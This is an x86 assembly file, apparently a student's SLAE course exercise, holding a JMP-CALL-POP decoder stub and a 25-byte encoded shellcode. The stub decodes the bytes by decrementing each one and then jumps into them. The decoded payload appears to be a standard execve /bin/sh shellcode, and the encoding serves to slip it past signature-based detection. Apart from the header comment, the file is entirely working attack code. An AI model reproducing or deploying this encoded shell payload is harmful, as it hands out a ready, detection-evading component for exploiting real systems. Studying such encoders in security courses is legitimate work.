; Filename    : decoder.asm
; Author      : Joris Hartog
; Date        : 09-12-2015
; Student     : SLAE-704
; Size        : 25 (code) + 19 (decoder) = 44
; Description : This program decodes a shellcode by
;  decrementing each byte by one.


global _start

section .text

_start:

	jmp short shellcodeCall

continueCode:
	
	pop eax			; eax contains pointer to shellcode
	push byte 25
	pop ecx			; ecx: shellcode length

decode:

	sub byte [eax], 0x01
	inc eax

        loop decode 		; loop 25 times

	jmp short shellcode

shellcodeCall:

	call continueCode
	shellcode: db 0x32,0xc1,0x51,0x8a,0xe3,0x69,0x30,0x30,0x74,0x69,0x69,0x30,0x63,0x6a,0x6f,0x8a,0xe4,0x51,0x54,0x8a,0xe2,0xb1,0x0c,0xce,0x81
